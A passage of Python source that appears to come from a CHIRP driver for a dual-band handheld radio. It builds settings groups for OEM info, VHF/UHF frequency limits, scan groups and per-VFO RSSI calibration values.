        oem_grp = RadioSettingGroup("oem_grp", "OEM Info")

        group = RadioSettings(cfg_grp, vfoa_grp, vfob_grp,
                              key_grp, scan_grp, lmt_grp, vpwr_grp,
                              upwr_grp,
                              vrxa_grp, urxa_grp,
                              vunkadja_grp, uunkadja_grp,
                              vrxb_grp, urxb_grp,
                              vunkadjb_grp, uunkadjb_grp,
                              adv_grp, oem_grp)


        self._createConfigSettings(_settings, cfg_grp)
        self._createVfoASettings(_settings, _vfoa, vfoa_grp)
        self._createVfoBSettings(_settings, _vfob, vfob_grp)
        self._createKeySettings(_settings, key_grp)
        self._createVhfPowerSettings(vpwr_grp)
        self._createUhfPowerSettings(upwr_grp)
        self._createVfoAVhfRxSettings(vrxa_grp)
        self._createVfoAUhfRxSettings(urxa_grp)
        self._createVfoAVhfUnkAdjSettings(vunkadja_grp)
        self._createVfoAUhfUnkAdjSettings(uunkadja_grp)
        self._createVfoBVhfUnkAdjSettings(vunkadjb_grp)
        self._createVfoBUhfUnkAdjSettings(uunkadjb_grp)
        self._createVfoBVhfRxSettings(vrxb_grp)
        self._createVfoBUhfRxSettings(urxb_grp)
        self._createScanGroupsSettings(scan_grp)
        self._createLimitsSettings(lmt_grp)
        self._createOemSettings(oem_grp)

        return group

    def _createOemSettings(self, oem_grp):
        def _decode(lst):
            _str = ''.join([chr(c) for c in lst
                            if chr(c) in chirp_common.CHARSET_ASCII])
            return _str

        _str = _decode(self._memobj.oem_info.model)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("oem_info.model", "Model", val)
        oem_grp.append(rs)
        _str = _decode(self._memobj.oem_info.model2)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("oem_info.model2", "Model2", val)
        oem_grp.append(rs)
        _str = _decode(self._memobj.oem_info.oem1)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("oem_info.oem1", "OEM String 1", val)
        oem_grp.append(rs)
        _str = _decode(self._memobj.oem_info.oem2)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("oem_info.oem2", "OEM String 2", val)
        oem_grp.append(rs)
        _str = _decode(self._memobj.oem_info.version)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("oem_info.version", "Software Version", val)
        oem_grp.append(rs)
        _str = _decode(self._memobj.oem_info.date)
        val = RadioSettingValueString(0, 15, _str)
        val.set_mutable(False)
        rs = RadioSetting("date", "OEM Date", val)
        oem_grp.append(rs)

    def _createLimitsSettings(self, lmt_grp):
        rs = RadioSetting("vhf_limits.rx_start", "VHF RX Lower Limit. Min: 130Mhz",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vhf_limits.rx_start * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("vhf_limits.rx_stop", "VHF RX Upper Limit. Max: 185Mhz",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vhf_limits.rx_stop * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("vhf_limits.tx_start", "VHF TX Lower Limit. Min: 130Mhz",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vhf_limits.tx_start * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("vhf_limits.tx_stop", "VHF TX Upper Limit. Max: 185Mhz",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vhf_limits.tx_stop * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("uhf_limits.rx_start", "UHF RX Lower Limit. Min: 230Mhz",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.uhf_limits.rx_start * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("uhf_limits.rx_stop", "UHF RX Upper Limit. Max: 480Mhz",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.uhf_limits.rx_stop * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("uhf_limits.tx_start", "UHF TX Lower Limit. Min: 230Mhz",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.uhf_limits.tx_start * 10, 5000))
        lmt_grp.append(rs)
        rs = RadioSetting("uhf_limits.tx_stop", "UHF TX Upper Limit. Max: 480Mhz",
                          RadioSettingValueInteger(
                              23000000, 580000000,
                              self._memobj.uhf_limits.tx_stop * 10, 5000))
        lmt_grp.append(rs)

    def _createScanGroupsSettings(self, scan_grp):
        rs = RadioSetting("scan_groups.0.lower", "1 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[0].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.0.upper", "1 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[0].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.1.lower", "2 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[1].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.1.upper", "2 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[1].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.2.lower", "3 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[2].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.2.upper", "3 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[2].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.3.lower", "4 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[3].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.3.upper", "4 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[3].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.4.lower", "5 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[4].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.4.upper", "5 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[4].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.5.lower", "6 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[5].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.5.upper", "6 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[5].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.6.lower", "7 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[6].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.6.upper", "7 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[6].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.7.lower", "8 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[7].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.7.upper", "8 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[7].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.8.lower", "9 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[8].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.8.upper", "9 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[8].upper, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.9.lower", "10 From",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[9].lower, 1))
        scan_grp.append(rs)
        rs = RadioSetting("scan_groups.9.upper", "10 To",
                          RadioSettingValueInteger(
                              1, 999,
                              self._memobj.scan_groups[9].upper, 1))
        scan_grp.append(rs)

    def _createVfoAUhfRxSettings(self, grp):
        rs = RadioSetting("vfoa_rssi_band.freq_start_uhf", "Frequency band start",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.vfoa_rssi_band.freq_start_uhf * 10, 1000000))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_band.freq_spacing_uhf", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_band.freq_spacing_uhf, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s1", "RSSI <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s2", "RSSI Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s3", "RSSI Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s4", "RSSI Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s5", "RSSI Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s6", "RSSI Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s7", "RSSI Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s8", "RSSI Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s9", "RSSI Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s10", "RSSI Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s11", "RSSI Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s12", "RSSI Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s13", "RSSI Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s14", "RSSI Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s15", "RSSI Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_uhf.s16", "RSSI >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_uhf.s16, 1))
        grp.append(rs)

    def _createVfoAVhfRxSettings(self, grp):
        rs = RadioSetting("vfoa_rssi_band.freq_start_vhf", "Frequency band start",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vfoa_rssi_band.freq_start_vhf * 10, 1000000))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_band.freq_spacing_vhf", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_band.freq_spacing_vhf, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s1", "RSSI <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s2", "RSSI Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s3", "RSSI Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s4", "RSSI Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s5", "RSSI Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s6", "RSSI Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s7", "RSSI Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s8", "RSSI Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s9", "RSSI Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s10", "RSSI Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s11", "RSSI Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s12", "RSSI Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s13", "RSSI Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s14", "RSSI Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s15", "RSSI Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_rssi_vhf.s16", "RSSI >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_rssi_vhf.s16, 1))
        grp.append(rs)

    def _createVfoAVhfUnkAdjSettings(self, grp):
        rs = RadioSetting("vfoa_vhf_unk_adj.s1", "<= Rng1",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s2", "Rng2",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s3", "Rng3",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s4", "Rng4",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s5", "Rng5",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s6", "Rng6",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s7", "Rng7",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s8", "Rng8",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s9", "Rng9",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s10", "Rng10",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s11", "Rng11",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s12", "Rng12",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s13", "Rng13",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s14", "Rng14",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s15", "Rng15",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_vhf_unk_adj.s16", "RX >= Rng16",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_vhf_unk_adj.s16, 1))
        grp.append(rs)

    def _createVfoAUhfUnkAdjSettings(self, grp):
        rs = RadioSetting("vfoa_uhf_unk_adj.s1", "<= Rng1",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s2", "Rng2",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s3", "Rng3",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s4", "Rng4",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s5", "Rng5",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s6", "Rng6",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s7", "Rng7 ",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s8", "Rng8",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s9", "Rng9",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s10", "Rng10",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s11", "Rng11",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s12", "Rng12",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s13", "Rng13",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s14", "Rng14",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s15", "Rng15",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfoa_uhf_unk_adj.s16", ">= Rng16",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfoa_uhf_unk_adj.s16, 1))
        grp.append(rs)

    def _createVfoBVhfRxSettings(self, grp):
        rs = RadioSetting("vfob_rssi_band.freq_start_vhf", "Frequency band start",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vfob_rssi_band.freq_start_vhf * 10, 1000000))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_band.freq_spacing_vhf", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_band.freq_spacing_vhf, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s1", "RSSI <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s2", "RSSI Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s3", "RSSI Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s4", "RSSI Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s5", "RSSI Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s6", "RSSI Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s7", "RSSI Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s8", "RSSI Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s9", "RSSI Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s10", "RSSI Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s11", "RSSI Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s12", "RSSI Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s13", "RSSI Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s14", "RSSI Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s15", "RSSI Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_vhf.s16", "RSSI >=Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_vhf.s16, 1))
        grp.append(rs)

    def _createVfoBUhfRxSettings(self, grp):
        rs = RadioSetting("vfob_rssi_band.freq_start_uhf", "Frequency band start",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.vfob_rssi_band.freq_start_uhf * 10, 1000000))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_band.freq_spacing_uhf", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_band.freq_spacing_uhf, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s1", "RSSI <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s2", "RSSI Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s3", "RSSI Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s4", "RSSI Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s5", "RSSI Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s6", "RSSI Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s7", "RSSI Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s8", "RSSI Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s9", "RSSI Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s10", "RSSI Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s11", "RSSI Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s12", "RSSI Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s13", "RSSI Rng13 (Band start + Spacing * 12)",
